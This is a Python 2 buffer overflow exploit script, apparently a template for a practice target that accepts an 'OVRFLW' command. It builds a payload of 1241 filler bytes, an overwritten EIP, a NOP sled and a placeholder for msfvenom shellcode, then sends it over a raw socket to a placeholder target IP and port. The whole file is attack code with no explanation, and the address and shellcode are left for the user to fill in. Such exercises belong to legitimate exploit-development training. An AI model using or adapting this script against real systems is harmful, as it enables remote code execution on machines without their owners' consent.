#!/usr/bin/python    
import socket
import time
import sys


cmd = "OVRFLW "
end = "\r\n"
filler = "A" * 1241
eip = "[EIP]"
offset  = "C" * 4
shellcode = ([MSFVENOM SHELLCODE HERE])
nops = "\x90" * 10
inputBuffer = filler + eip + offset + nops + shellcode
buffer = cmd + inputBuffer + end
    
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("[TARGET IP]", [PORT])) 
s.send(buffer)
resp = s.recv(1024)
print(resp)
s.close()
